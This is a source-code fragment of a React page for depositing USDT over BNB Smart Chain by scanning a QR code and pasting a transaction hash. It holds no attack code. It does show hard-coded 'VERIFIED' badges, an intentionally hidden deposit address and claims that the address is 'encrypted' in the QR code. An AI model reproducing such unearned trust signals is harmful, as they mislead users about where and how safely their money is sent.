                      <RiRefreshLine size={24} className="animate-spin text-slate-950" />
                    </div>
                    <div className="text-center">
                      <span className="text-xs font-extrabold text-gold-300 font-poppins block leading-tight">
                        Rotating Vault...
                      </span>
                      <span className="text-[9px] text-slate-300 font-mono mt-0.5 block">
                        New BEP-20 Matrix
                      </span>
                    </div>
                  </div>
                )}

                <img
                  src={getActiveQrCodeUrl(dynamicDepositoryAddress, amount, qrNonce, sessionRef)}
                  alt="Dynamic Smart Contract Vault QR"
                  className={`w-full h-full object-cover rounded-2xl transition-all duration-500 ${
                    refreshingQr ? 'opacity-20 scale-90 blur-xs' : 'opacity-100 scale-100 blur-0'
                  }`}
                />

                {/* Center Binance / BSC Badge Icon */}
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <div className="w-10 h-10 rounded-xl bg-slate-950 border-2 border-gold-400 p-1 flex items-center justify-center shadow-md">
                    <svg className="w-6 h-6 text-gold-400" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M12 2L4 6v12l8 4 8-4V6l-8-4zm0 2.8l5.6 2.8L12 10.4 6.4 7.6 12 4.8zm-6 4.3l5 2.5v5.8l-5-2.5v-5.8zm7 8.3v-5.8l5-2.5v5.8l-5 2.5z" />
                    </svg>
                  </div>
                </div>

                {/* Top-Right VERIFIED Badge */}
                <div className="absolute -top-2.5 -right-2.5 bg-emerald-500 text-white text-[9px] font-extrabold px-2.5 py-1 rounded-full shadow-lg flex items-center gap-1 border-2 border-white">
                  <RiShieldCheckLine size={11} /> VERIFIED
                </div>

                <div className="absolute inset-0 rounded-2xl bg-slate-950/60 opacity-0 group-hover:opacity-100 flex flex-col items-center justify-center transition-opacity gap-2">
                  <RiQrCodeLine size={32} className="text-white" />
                  <span className="text-[10px] font-extrabold text-white tracking-widest uppercase">Tap to Expand</span>
                </div>
              </div>

              {/* Fullscreen scan button */}
              <button
                type="button"
                onClick={() => setIsQrModalOpen(true)}
                className="w-full max-w-sm py-3.5 px-6 rounded-2xl bg-gradient-to-r from-gold-500 to-amber-500 hover:from-gold-600 hover:to-amber-600 text-white font-bold text-sm flex items-center justify-center gap-2.5 shadow-gold cursor-pointer transition-all hover:scale-[1.01]"
              >
                <RiQrCodeLine size={20} />
                <span> Open Full-Screen QR to Scan</span>
              </button>

              {/* Official Depository Vault - Commented out to keep address hidden */}
              {/*
              <div className={`w-full max-w-lg p-4 rounded-2xl transition-all duration-500 border text-left flex flex-col gap-2.5 ${
                justRefreshed
                  ? 'bg-emerald-50/90 border-emerald-400 ring-4 ring-emerald-200/60 shadow-lg'
                  : 'bg-slate-50 border-slate-200 shadow-2xs'
              }`}>
                <div className="flex items-center justify-between flex-wrap gap-2">
                  <span className="text-[10px] font-extrabold uppercase tracking-wider text-slate-600 font-poppins flex items-center gap-1.5">
                    <RiShieldCheckLine size={14} className="text-emerald-500" />
                    OFFICIAL DEPOSITORY VAULT (BNB SMART CHAIN (BEP-20))
                  </span>
                  <div className="flex items-center gap-1.5">
                    {justRefreshed && (
                      <span className="text-[9px] font-black px-2 py-0.5 rounded-full bg-emerald-600 text-white animate-pulse">
                        ✨ Refreshed
                      </span>
                    )}
                    <span className="text-[10px] font-mono font-bold px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-300">
                      {sessionRef}
                    </span>
                  </div>
                </div>

                <div className={`flex items-center justify-between bg-white px-3.5 py-2.5 rounded-xl border gap-2 shadow-2xs transition-all ${
                  justRefreshed ? 'border-emerald-400 ring-2 ring-emerald-200' : 'border-slate-200'
                }`}>
                  <div className="flex items-center gap-2.5 min-w-0">
                    <div className="w-8 h-8 rounded-lg bg-emerald-50 text-emerald-600 border border-emerald-200 flex items-center justify-center shrink-0">
                      <RiLock2Line size={16} />
                    </div>
                    <div className="min-w-0">
                      <span className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
                        <span>Vault Address Protected</span>
                        <span className="text-[9px] font-bold px-1.5 py-0.5 rounded bg-slate-100 text-slate-500 uppercase tracking-wider">
                          QR Only
                        </span>
                      </span>
                      <span className="text-[11px] text-slate-500 font-medium block truncate">
                        🔒 Encrypted in QR Code • Scan with wallet app to pay
                      </span>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={handleGenerateRefreshQr}
                    disabled={refreshingQr}
                    className="px-3.5 py-2 rounded-xl bg-gold-400 hover:bg-gold-500 text-slate-950 text-xs font-bold flex items-center gap-1.5 transition-all flex-shrink-0 cursor-pointer shadow-xs active:scale-95 disabled:opacity-60"
                    title="Refresh QR Scanner with New Session Vault"
                  >
                    <RiRefreshLine size={14} className={refreshingQr ? 'animate-spin' : ''} />
                    <span>{refreshingQr ? 'Refreshing...' : 'Refresh QR'}</span>
                  </button>
                </div>

                <div className="flex items-center justify-between text-[11px] text-slate-500 pt-0.5">
                  <span>Send only <strong className="text-slate-800">BNB Smart Chain (BEP-20)</strong> USDT.</span>
                  <span className="text-emerald-700 font-bold text-[10px]">Rotational Smart Contract Vault</span>
                </div>
              </div>
              */}

              {/* Simple Network Instruction */}
              <div className="py-1 text-center">
                <p className="text-xs sm:text-sm text-slate-600 font-medium">
                  Send only <strong className="text-slate-900 font-bold">BNB Smart Chain (BEP-20)</strong> USDT.
                </p>
              </div>

              {/* 3 Step Pills */}
              <div className="flex items-center gap-2 flex-wrap justify-center pt-1">
                <div className="flex items-center gap-1.5 bg-gold-50 border border-gold-200 px-3.5 py-1.5 rounded-full text-xs">
                  <span className="w-4 h-4 rounded-full bg-gold-500 text-white text-[10px] font-extrabold flex items-center justify-center">1</span>
                  <span className="font-bold text-gold-900">Scan QR</span>
                </div>
                <RiArrowRightLine size={14} className="text-slate-300" />
                <div className="flex items-center gap-1.5 bg-gold-50 border border-gold-200 px-3.5 py-1.5 rounded-full text-xs">
                  <span className="w-4 h-4 rounded-full bg-gold-500 text-white text-[10px] font-extrabold flex items-center justify-center">2</span>
                  <span className="font-bold text-gold-900">Send USDT</span>
                </div>
                <RiArrowRightLine size={14} className="text-slate-300" />
                <div className="flex items-center gap-1.5 bg-emerald-50 border border-emerald-200 px-3.5 py-1.5 rounded-full text-xs">
                  <span className="w-4 h-4 rounded-full bg-emerald-500 text-white text-[10px] font-extrabold flex items-center justify-center">3</span>
                  <span className="font-bold text-emerald-800">Paste TxHash below</span>
                </div>
              </div>
            </div>

            {/* ── CARD 4: SUBMIT TXHASH FOR AUTO-CREDIT (FOR QR / EXTERNAL SCANNERS) ── */}
            <form onSubmit={handleSubmitDeposit} className="space-y-4 pt-4 border-t border-slate-100 font-poppins">
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400 block">
                    BLOCKCHAIN TRANSACTION HASH (TXID / HASH) <span className="text-red-500">*</span>
                  </label>
                  <button
                    type="button"
                    onClick={handleAutoDetect}
                    disabled={autoDetecting}
                    className="text-[11px] font-bold text-gold-700 hover:text-gold-900 flex items-center gap-1 cursor-pointer"
                  >
                    <RiFlashlightLine size={12} />
                    <span>{autoDetecting ? 'Scanning BSC...' : '1-Click Auto-Detect'}</span>
                  </button>
                </div>

                <div className="relative">
                  <input
                    type="text"
                    value={transactionHash}
                    onChange={e => setTransactionHash(e.target.value)}
                    placeholder="0x... (Paste your 66-character BscScan TxHash)"
                    className="w-full px-4 py-3.5 rounded-2xl bg-white border border-slate-200 text-xs sm:text-sm font-mono font-medium text-slate-900 placeholder:text-slate-400 outline-none focus:border-gold-400 focus:ring-2 focus:ring-gold-200/60"
                  />
                </div>
                <p className="text-[11px] text-slate-400 mt-1.5 leading-relaxed">
                  ⚡ System scans BNB Smart Chain on-chain and auto-credits your Deposit Wallet immediately upon confirmation.
                </p>
              </div>

              {/* Optional Payment Receipt / Slip */}
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400 block">
                    TRANSFER SCREENSHOT (OPTIONAL)
                  </label>
                  <span className="text-[10px] font-semibold text-slate-400">
                    PNG, JPG, PDF
                  </span>
                </div>

                {paymentSlip ? (
                  <div className="p-3 bg-slate-50 rounded-2xl border border-slate-200 flex items-center justify-between gap-3">
                    <div className="flex items-center gap-2.5 min-w-0">
                      {paymentSlip.isImage ? (
                        <img
                          src={paymentSlip.dataUrl}
                          alt="Slip Preview"
                          className="w-10 h-10 object-cover rounded-xl border border-slate-200"
                        />
                      ) : (
                        <div className="w-10 h-10 rounded-xl bg-red-50 text-red-600 font-mono text-[10px] font-bold flex items-center justify-center">
                          PDF
                        </div>
                      )}
                      <div className="min-w-0">
                        <span className="text-xs font-semibold text-slate-800 truncate block">
                          {paymentSlip.name}
                        </span>
                        <span className="text-[10px] text-slate-400">
                          {paymentSlip.size}
                        </span>
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={handleRemoveSlip}
                      className="p-1.5 text-slate-400 hover:text-red-500 rounded-lg cursor-pointer"
                    >
                      <RiDeleteBinLine size={16} />
                    </button>
                  </div>
                ) : (
                  <label className="p-3.5 rounded-2xl border-2 border-dashed border-slate-200 hover:border-gold-300 bg-slate-50/50 hover:bg-slate-50 flex items-center justify-center gap-2 text-xs font-medium text-slate-500 cursor-pointer transition-all">
                    <RiUploadCloud2Line size={18} className="text-gold-600" />
                    <span>Attach transfer receipt / screenshot</span>
                    <input
                      type="file"
                      accept="image/*,.pdf"
                      onChange={handleSlipUpload}
                      className="hidden"
                    />
                  </label>
                )}
              </div>

              {errorMsg && (
                <div className="p-3 bg-red-50 border border-red-200 rounded-2xl text-xs text-red-600 font-medium flex items-start gap-2">
                  <RiAlertLine size={16} className="shrink-0 mt-0.5" />
                  <span>{errorMsg}</span>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={submitting || !transactionHash.trim()}
                className="w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-black text-sm flex items-center justify-center gap-2.5 shadow-lg cursor-pointer transition-all hover:scale-[1.01] active:scale-95 disabled:opacity-50"
              >
                {submitting ? (
                  <>
                    <RiLoader4Line size={18} className="animate-spin" />
                    <span>Verifying On-Chain...</span>
                  </>
                ) : (
                  <>
                    <RiCheckboxCircleLine size={18} />
                    <span>Verify & Credit Deposit Wallet</span>
                  </>
                )}
              </button>
            </form>
          </div>
        </div>
      </div>

      {/* ════════ MODAL 1: FULL-SCREEN SCANNER QR MODAL ════════ */}
      <Modal
        isOpen={isQrModalOpen}
        onClose={() => setIsQrModalOpen(false)}
        title="Smart Contract Depository QR"
        subtitle="Scan with Binance, OKX, Trust Wallet or any crypto wallet app"
        size="md"
      >
        <div className="p-4 flex flex-col items-center text-center space-y-4 font-poppins">
          <div className="p-4 bg-white rounded-3xl border-4 border-gold-400 shadow-gold relative">
            <img
              src={getActiveQrCodeUrl(dynamicDepositoryAddress, amount, qrNonce, sessionRef)}
              alt="Official Smart Contract QR"
              className="w-64 h-64 sm:w-72 sm:h-72 object-cover rounded-2xl"
            />
            {/* Center BSC Logo */}
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
              <div className="w-12 h-12 rounded-xl bg-slate-950 border-2 border-gold-400 p-1 flex items-center justify-center shadow-lg">
                <svg className="w-7 h-7 text-gold-400" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L4 6v12l8 4 8-4V6l-8-4zm0 2.8l5.6 2.8L12 10.4 6.4 7.6 12 4.8zm-6 4.3l5 2.5v5.8l-5-2.5v-5.8zm7 8.3v-5.8l5-2.5v5.8l-5 2.5z" />
                </svg>
              </div>
            </div>
            <div className="absolute -top-3 -right-3 bg-emerald-500 text-white text-[10px] font-extrabold px-3 py-1 rounded-full shadow-lg flex items-center gap-1 border-2 border-white">
              <RiShieldCheckLine size={12} /> VERIFIED BEP-20
            </div>
          </div>

          {/* Official Depository Vault in modal - Commented out to keep address hidden */}
          {/*
          <div className="w-full p-3.5 bg-slate-50 rounded-2xl border border-slate-200 text-left space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold uppercase tracking-wider text-slate-500 flex items-center gap-1.5">
                <RiShieldCheckLine size={13} className="text-emerald-500" />
                SECURE SMART CONTRACT VAULT
              </span>
              <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 border border-emerald-200">
                {sessionRef}
              </span>
            </div>
            <div className="flex items-center justify-between bg-white px-3.5 py-2.5 rounded-xl border border-slate-200 gap-2">
              <div className="flex items-center gap-2">
                <RiLock2Line size={16} className="text-emerald-600 shrink-0" />
                <span className="text-xs text-slate-700 font-bold">
                  Address Protected • Scan QR Code to Deposit
                </span>
              </div>
              <button
                type="button"
                onClick={handleGenerateRefreshQr}
                disabled={refreshingQr}
                className="px-3 py-1.5 rounded-lg bg-gold-400 hover:bg-gold-500 text-slate-950 text-xs font-bold shrink-0 cursor-pointer active:scale-95 flex items-center gap-1.5 disabled:opacity-50"
              >
                <RiRefreshLine size={13} className={refreshingQr ? 'animate-spin' : ''} />
                <span>{refreshingQr ? 'Refreshing...' : 'Refresh QR'}</span>
              </button>
            </div>
          </div>
          */}

          <p className="text-xs text-slate-500 max-w-sm">
            Please transfer only <strong>USDT via BNB Smart Chain (BEP-20)</strong>. Any other asset sent cannot be recovered.
          </p>

          <button
            type="button"
            onClick={() => setIsQrModalOpen(false)}
            className="w-full py-3 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs"
          >
            Done Scanning
          </button>
        </div>
      </Modal>

      {/* ════════ MODAL 2: OFFICIAL VIDEO TUTORIAL ════════ */}
      <Modal
        isOpen={isVideoModalOpen}
        onClose={() => setIsVideoModalOpen(false)}
        title={tutorialVideo.title || "Smart Contract Deposit Tutorial"}
        subtitle={tutorialVideo.subtitle}
        size="lg"
      >
        <div className="p-2 space-y-4 font-poppins">
          <div className="relative rounded-2xl overflow-hidden bg-slate-950 aspect-video shadow-md">
            {tutorialVideo.videoUrl ? (
              <video
                src={tutorialVideo.videoUrl}
                controls
                className="w-full h-full object-cover"
                poster="/logo.png"
              />
            ) : (
              <div className="w-full h-full flex flex-col items-center justify-center text-slate-400">
                <RiPlayCircleLine size={48} />
                <span className="text-xs mt-2">Tutorial video ready</span>
              </div>
            )}
          </div>

          <div className="p-4 bg-slate-50 rounded-2xl border border-slate-200 text-xs space-y-2">
            <span className="font-bold text-slate-900 block uppercase tracking-wider text-[10px]">
              Key Steps to Deposit:
            </span>
            <ul className="space-y-1.5 text-slate-600 list-disc list-inside">
              {(tutorialVideo.instructions || []).map((ins, i) => (
                <li key={i}>{ins}</li>
              ))}
            </ul>
          </div>
        </div>
      </Modal>

      {/* ════════ MODAL 3: DEPOSIT SUBMISSION SUCCESS RECEIPT ════════ */}
      <Modal
        isOpen={isSuccessModalOpen}
        onClose={() => setIsSuccessModalOpen(false)}
        title="Deposit Verified & Credited!"
        subtitle="Official Smart Contract Receipt"
        size="md"
        footer={
          <div className="flex items-center justify-between w-full">
            <Link
              to="/transactions"
              className="btn btn-secondary text-xs px-4 py-2.5 rounded-xl font-bold"
            >
              View Transactions
            </Link>
            <button
              type="button"
              onClick={() => setIsSuccessModalOpen(false)}
              className="btn btn-primary text-xs px-5 py-2.5 rounded-xl font-bold shadow-gold cursor-pointer"
            >
              Done
            </button>
          </div>
        }
      >
        {submittedDepositInfo && (
          <div className="space-y-5 font-poppins text-center py-2">
            <div className="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto shadow-xs">
              <RiCheckLine size={32} className="font-extrabold" />
            </div>

            <div>
              <h4 className="text-lg font-bold text-slate-900 font-display">
                Deposit Confirmed on BNB Smart Chain!
              </h4>
              <p className="text-xs text-slate-500 mt-1">
                Your funds have been verified on-chain and credited directly to your Deposit Wallet.
              </p>
            </div>

            <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200 text-left space-y-2.5 text-xs">
              <div className="flex justify-between py-1 border-b border-slate-200/60">
                <span className="text-slate-500 font-medium">Receipt ID:</span>
                <span className="font-mono font-bold text-slate-900">{submittedDepositInfo.id}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-200/60">
                <span className="text-slate-500 font-medium">Channel:</span>
                <span className="font-bold text-slate-900">{submittedDepositInfo.method}</span>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-200/60">
                <span className="text-slate-500 font-medium">Credited Amount:</span>
                <strong className="font-bold text-emerald-600 font-mono text-sm">
                  ${submittedDepositInfo.amount} USD
                </strong>
              </div>
              <div className="flex justify-between py-1 border-b border-slate-200/60">
                <span className="text-slate-500 font-medium">Blockchain Hash:</span>
                <span className="font-mono font-semibold text-slate-800 truncate max-w-[180px]">
                  {submittedDepositInfo.hash}
                </span>
              </div>
              <div className="flex justify-between py-1">
                <span className="text-slate-500 font-medium">Status:</span>
                <span className="px-2 py-0.5 rounded-md bg-emerald-100 text-emerald-800 font-bold text-[10px]">
                  {submittedDepositInfo.status}
                </span>
              </div>
            </div>
          </div>
        )}
      </Modal>
    </div>
  );
}
